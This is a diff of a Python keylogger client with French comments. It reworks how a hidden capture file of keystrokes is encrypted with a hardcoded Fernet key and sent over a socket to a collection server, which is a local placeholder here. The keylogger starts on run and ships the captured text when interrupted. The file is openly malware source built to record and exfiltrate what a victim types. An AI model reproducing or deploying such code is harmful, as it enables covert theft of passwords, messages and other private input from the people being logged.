@@ -1,22 +1,11 @@
 import keylogger
 import socket
-import ssl
 import requests
 import time  
 import os  
 from datetime import datetime
+from cryptography.fernet import Fernet
 
-def generate_keys():
-    # Générer une paire de clés pour le client
-    os.system("openssl req -nodes -newkey rsa:2048 -keyout client_private_key.pem -out client_csr.pem")
-    os.system("openssl x509 -req -sha256 -days 365 -in client_csr.pem -signkey client_private_key.pem -out client_public_key.pem")
-
-# Générer les clés pour le client
-generate_keys()
-
-# Chemins des clés du client
-PRIVATE_KEY = "client_private_key.pem"
-PUBLIC_KEY = "client_public_key.pem"
 
 # Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
 def get_filename():
@@ -42,61 +31,44 @@ def stop_and_delete_capture_file():
     stop_keylogger()
 
     # Supprimer le fichier de capture
-    try:
-        file_path = ".document1.txt"  # Assurez-vous que c'est le bon chemin
-        os.remove(file_path)
-        print(f"Fichier {file_path} supprimé avec succès.")
-    except Exception as e:
-        print(f"Erreur lors de la suppression du fichier : {e}")
+    file = ".document1.txt"  # Assurez-vous que c'est le bon chemin
+    os.remove(file)
+  
 
 # Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
-def send_file_securely(file_path, server_address, server_port):
+def send_file_securely(server_address, server_port):
     # Créer une socket TCP
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Créer un contexte SSL
-    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-    context.load_cert_chain(certfile=PRIVATE_KEY, keyfile=PUBLIC_KEY)
-
-    # Établir une connexion sécurisée avec le serveur
-    secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)
-
     try:
+        key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
         # Se connecter au serveur
-        secure_socket.connect((server_address, server_port))
+        client_socket.connect((server_address, server_port))
 
         # Envoyer le nom du fichier au serveur
         filename = get_filename()
-        secure_socket.send(filename.encode())
+        encrypted_message = Fernet(key).encrypt(filename.encode())
+        client_socket.send(encrypted_message)
 
         # Envoyer le contenu du fichier au serveur
         with open(".document1.txt", "r") as file:
-            file_data = file.read()
-            secure_socket.sendall(file_data.encode())
+            lines = file.read()
+            print(lines)
+            encrypted_lines = Fernet(key).encrypt(lines.encode())
 
-        # Recevoir l'ordre du serveur
-        order = secure_socket.recv(1024).decode()
-
-        # Si l'ordre est d'arrêter et supprimer le fichier
-        if order == "STOP_AND_DELETE":
-            stop_and_delete_capture_file()
+            client_socket.send(encrypted_lines)
 
         print("Fichier envoyé avec succès.")
     except Exception as e:
         print(f"Erreur lors de l'envoi du fichier : {e}")
     finally:
         # Fermer la connexion
-        secure_socket.close()
+        client_socket.close()
 
-if __name__ == "__main__":
-    # Fichier à envoyer
-    file_to_send = "chemin_du_fichier.txt"
 
-    # Adresse du serveur
-    server_address = "adresse_du_serveur"
-
-    # Port du serveur
-    server_port = 12345
-
-    # Envoyer le fichier de manière sécurisée au serveur
-    send_file_securely(file_to_send, server_address, server_port)
+try:
+    launch_keylogger()
+except KeyboardInterrupt:
+    stop_keylogger()
+    send_file_securely("127.0.0.1", 1234)
+    print("Interruption clavier détectée. Arrêt du keylogger et envoi du fichier.")
